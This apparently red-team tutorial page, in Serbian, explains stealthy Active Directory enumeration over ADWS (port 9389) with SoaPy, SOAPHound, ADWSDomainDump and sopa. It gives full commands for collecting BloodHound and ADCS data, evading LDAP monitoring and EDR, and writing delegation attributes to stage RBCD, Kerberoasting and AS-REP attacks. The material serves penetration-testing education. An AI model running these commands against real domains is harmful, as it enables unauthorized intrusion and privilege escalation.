# Active Directory Web Services (ADWS) Enumeracija i skriveno prikupljanje

{{#include ../../banners/hacktricks-training.md}}

## Šta je ADWS?

Active Directory Web Services (ADWS) je **omogućen po defaultu na svakom Domain Controller-u od Windows Server 2008 R2** i osluškuje na TCP **9389**. Uprkos imenu, **HTTP nije uključen**. Umesto toga, servis izlaže LDAP-slične podatke preko sloja vlasničkih .NET framing protokola:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Pošto je saobraćaj enkapsuliran unutar ovih binarnih SOAP frejmova i putuje preko neuobičajenog porta, **enumeracija preko ADWS-a je znatno manje verovatno da će biti inspektovana, filtrirana ili potpisana u odnosu na klasični LDAP/389 & 636 saobraćaj**. Za operatore to znači:

* Diskretniji recon – Blue teams često koncentrišu pažnju na LDAP upite.
* Mogućnost prikupljanja sa hostova koji nisu Windows (Linux, macOS) tunelovanjem 9389/TCP kroz SOCKS proxy.
* Iste podatke koje biste dobili putem LDAP-a (users, groups, ACLs, schema, itd.) i mogućnost izvršavanja **writes** (npr. `msDs-AllowedToActOnBehalfOfOtherIdentity` za **RBCD**).

Interakcije sa ADWS se sprovode preko WS-Enumeration: svaki upit počinje `Enumerate` porukom koja definiše LDAP filter/atribute i vraća `EnumerationContext` GUID, a zatim sledi jedna ili više `Pull` poruka koje strimuju do prozora rezultata koji je definisao server. Konteksti ističu nakon ~30 minuta, tako da alati moraju da paginiraju rezultate ili podele filtere (prefix pretrage po CN) kako bi izbegli gubitak stanja. Kada tražite security descriptor-e, navedite `LDAP_SERVER_SD_FLAGS_OID` control da izostavite SACLs, inače ADWS jednostavno izbacuje atribut `nTSecurityDescriptor` iz svog SOAP odgovora.

> NAPOMENA: ADWS se takođe koristi u mnogim RSAT GUI/PowerShell alatima, tako da saobraćaj može da se uklopi sa legitimnim administratorskim aktivnostima.

## SoaPy – Native Python klijent

[SoaPy](https://github.com/logangoins/soapy) je **potpuna re-implementacija ADWS protokolnog stack-a u čistom Python-u**. Kreira NBFX/NBFSE/NNS/NMF frejmove bajt-po-bajt, omogućavajući prikupljanje sa Unix-like sistema bez korišćenja .NET runtime-a.

### Ključne karakteristike

* Podržava **proksiranje preko SOCKS** (korisno za C2 implantate).
* Fino-granularni filteri pretrage identični LDAP `-q '(objectClass=user)'`.
* Opcione **write** operacije (`--set` / `--delete`).
* **BOFHound output mode** za direktan unos u BloodHound.
* `--parse` flag za lepše prikazivanje timestamps / `userAccountControl` kada je potrebna čitljivost za ljude.

### Ciljani flagovi za prikupljanje i write operacije

SoaPy dolazi sa kuriranim prekidačima koji repliciraju najčešće LDAP hunting zadatke preko ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus raw `--query` / `--filter` opcije za prilagođene pull-ove. Povežite ih sa write primitivima kao `--rbcd <source>` (postavlja `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging za ciljano Kerberoasting) i `--asrep` (preokrene `DONT_REQ_PREAUTH` u `userAccountControl`).

Primer ciljane SPN pretrage koja vraća samo `samAccountName` i `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Koristite isti host/credentials da odmah weaponise nalaze: dump RBCD-capable objects with `--rbcds`, zatim primenite `--rbcd 'WEBSRV01$' --account 'FILE01$'` da postavite Resource-Based Constrained Delegation lanac (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) za ceo put zloupotrebe).

### Instalacija (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* Fork `ldapdomaindump` koji zamenjuje LDAP upite ADWS pozivima na TCP/9389 radi smanjenja okidanja LDAP-signature.
* Izvodi početnu proveru dostupnosti na portu 9389 osim ako nije prosleđen `--force` (preskače probe ako su skeniranja portova bučna/filtrirana).
* Testirano protiv Microsoft Defender for Endpoint i CrowdStrike Falcon sa uspešnim bypass-om opisanим u README.

### Instalacija
```bash
pipx install .
```
### Upotreba
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Tipičan izlaz beleži 9389 reachability check, ADWS bind, i dump start/finish:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Praktični klijent za ADWS u Golangu

Slično kao soapy, [sopa](https://github.com/Macmod/sopa) implementira ADWS protocol stack (MS-NNS + MC-NMF + SOAP) u Golangu, izlažući parametre komandne linije za slanje ADWS poziva kao što su:

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* and others such as `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – Prikupljanje velike količine podataka iz ADWS (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) je .NET collector koji zadržava sve LDAP interakcije unutar ADWS i emituje BloodHound v4-compatible JSON. Pravi potpun cache od `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` jednom (`--buildcache`), zatim ga ponovo koristi za visokopropusne `--bhdump`, `--certdump` (ADCS), ili `--dnsdump` (AD-integrated DNS) prolaze tako da samo ~35 kritičnih atributa ikada napusti DC. AutoSplit (`--autosplit --threshold <N>`) automatski razdeljuje upite po CN prefiksu da ostane ispod 30-minutnog EnumerationContext timeout-a u velikim šumama.

Tipičan tok rada na VM operatera pridruženom domeni:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Izvezeni JSON slotovi direktno u SharpHound/BloodHound tokove rada — pogledajte [BloodHound methodology](bloodhound.md) za ideje za dalje generisanje grafova. AutoSplit čini SOAPHound otpornim na šume sa više miliona objekata, istovremeno držeći broj upita nižim nego kod ADExplorer-style snimaka.

## Stealth AD Collection Workflow

Sledeći tok rada prikazuje kako da enumerišete **domain & ADCS objects** preko ADWS, konvertujete ih u BloodHound JSON i tražite puteve napada zasnovane na sertifikatima – sve sa Linuxa:

1. **Tunnel 9389/TCP** sa ciljne mreže do vaše mašine (npr. putem Chisel, Meterpreter, SSH dynamic port-forward, itd.). Podesite `export HTTPS_PROXY=socks5://127.0.0.1:1080` ili koristite SoaPy’s `--proxyHost/--proxyPort`.

2. **Prikupite root domain objekat:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Sakupi objekte vezane za ADCS iz Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konvertuj u BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Otpremite ZIP** u BloodHound GUI i pokrenite cypher upite kao što je `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` da biste otkrili putanje eskalacije sertifikata (ESC1, ESC8, itd.).

### Pisanje `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombinujte ovo sa `s4u2proxy`/`Rubeus /getticket` za kompletan **Resource-Based Constrained Delegation** lanac (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Sažetak alata

| Svrha | Alat | Napomene |
|---------|------|-------|
| ADWS enumeracija | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| Dump visokog obima ADWS | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| Uvoz za BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Konvertuje SoaPy/ldapsearch logove |
| Kompromitovanje sertifikata | [Certipy](https://github.com/ly4k/Certipy) | Može se proksirati kroz isti SOCKS |
| ADWS enumeracija i izmene objekata | [sopa](https://github.com/Macmod/sopa) | Generički klijent za interakciju sa poznatim ADWS endpoints - omogućava enumeraciju, kreiranje objekata, izmenu atributa i promenu lozinki |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
